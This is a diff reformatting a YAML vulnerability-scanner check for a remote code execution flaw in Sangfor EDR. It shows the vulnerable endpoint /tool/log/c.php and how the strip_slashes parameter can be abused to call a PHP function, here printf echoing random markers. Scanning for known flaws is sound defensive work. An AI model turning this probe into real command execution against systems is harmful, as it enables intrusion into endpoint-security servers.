@@ -1,14 +1,19 @@
 name: poc-yaml-sangfor-edr-tool-rce
+manual: true
+transport: http
 set:
-  r1: randomLowercase(8)
-  r2: randomLowercase(8)
+    r1: randomLowercase(8)
+    r2: randomLowercase(8)
 rules:
-  - method: GET
-    path: "/tool/log/c.php?strip_slashes=printf&host={{r1}}%25%25{{r2}}"
-    follow_redirects: false
-    expression: |
-      response.status == 200 && response.body.bcontains(bytes(r1 + "%" + r2))
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /tool/log/c.php?strip_slashes=printf&host={{r1}}%25%25{{r2}}
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(r1 + "%" + r2))
+expression: r0()
 detail:
-  author: cookie
-  links:
-    - https://edr.sangfor.com.cn/
+    author: cookie
+    links:
+        - https://edr.sangfor.com.cn/
